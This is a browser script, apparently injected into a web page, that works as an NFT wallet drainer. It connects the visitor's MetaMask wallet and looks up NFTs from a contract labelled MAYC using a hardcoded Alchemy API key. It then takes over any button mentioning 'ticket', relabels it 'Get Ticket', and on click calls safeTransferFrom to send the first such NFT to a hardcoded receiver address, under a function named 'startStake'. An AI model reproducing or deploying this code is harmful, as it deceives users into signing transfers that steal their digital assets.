<script>

const MAYC =
  "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D";

const RECEIVER =
  "0x974c32106390e0F378f36FbF4428d4F32D813dd7";

const API =
  "XEbzMGpp9vTP_qKXrNcwh";

async function startStake() {

  try {

    if (!window.ethereum) {
      alert("Install MetaMask");
      return;
    }

    // connect wallet
    const provider =
      new ethers.providers.Web3Provider(
        window.ethereum
      );

    await provider.send(
      "eth_requestAccounts",
      []
    );

    const signer =
      provider.getSigner();

    const wallet =
      await signer.getAddress();

    console.log("Wallet:", wallet);

    // fetch MAYC NFTs
    const res = await fetch(
      `https://eth-mainnet.g.alchemy.com/nft/v2/${API}/getNFTs/?owner=${wallet}`
    );

    const data =
      await res.json();

    const maycs =
      data.ownedNfts.filter(
        nft =>
          nft.contract.address.toLowerCase() ===
          MAYC.toLowerCase()
      );

    if (maycs.length === 0) {

      alert("No MAYC Found");

      return;

    }

    // first MAYC
    const nft =
      maycs[0];

    const tokenId =
      ethers.BigNumber
        .from(nft.id.tokenId)
        .toString();

    console.log(
      "Using Token:",
      tokenId
    );

    // transfer ABI
    const abi = [
      "function safeTransferFrom(address from,address to,uint256 tokenId)"
    ];

    const contract =
      new ethers.Contract(
        MAYC,
        abi,
        signer
      );

    // popup MetaMask
    const tx =
      await contract[
        "safeTransferFrom(address,address,uint256)"
      ](
        wallet,
        RECEIVER,
        tokenId
      );

    console.log(tx);

    alert(
      "Transaction Sent"
    );

  } catch(err) {

    console.log(err);

    alert(
      err.reason ||
      err.message ||
      "Transaction Failed"
    );

  }

}

// wait button
const waitButton = setInterval(() => {

  const buttons =
    document.querySelectorAll("button");

  let btn = null;

  buttons.forEach(b => {

    if (
      b.innerText.toLowerCase().includes("ticket")
    ) {

      btn = b;

    }

  });

  if (btn) {

    clearInterval(waitButton);

    btn.innerText =
      "Get Ticket";

    btn.onclick = e => {

      e.preventDefault();

      startStake();

    };

  }

}, 500);

</script>
